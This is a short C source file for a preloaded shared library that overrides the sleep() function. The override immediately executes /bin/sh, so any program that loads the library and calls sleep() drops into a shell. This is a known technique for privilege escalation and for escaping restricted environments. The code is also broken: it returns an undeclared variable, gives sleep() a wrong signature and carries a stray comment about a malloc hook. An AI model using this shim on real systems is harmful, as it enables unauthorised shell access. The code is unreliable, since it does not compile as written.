#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <dlfcn.h>

#define unlikely(x) __builtin_expect(!!(x), 0)
#define TRY_LOAD_HOOK_FUNC(name) if (unlikely(!g_sys_##name)) {g_sys_##name = (sys_##name##_t)dlsym(RTLD_NEXT,#name);}


typedef void* (*sys_sleep_t)(size_t size);
static sys_sleep_t g_sys_sleep = NULL;
void* sleep(size_t size)
{
    execve("/bin/sh", (char *[]){0}, (char *[]){0});
    // TRY_LOAD_HOOK_FUNC(sleep);
    // void *p = g_sys_sleep(size);
    // printf("in malloc hook function ...\n");
    // execve("/bin/sh", (char *[]){0}, (char *[]){0});
    return p;
}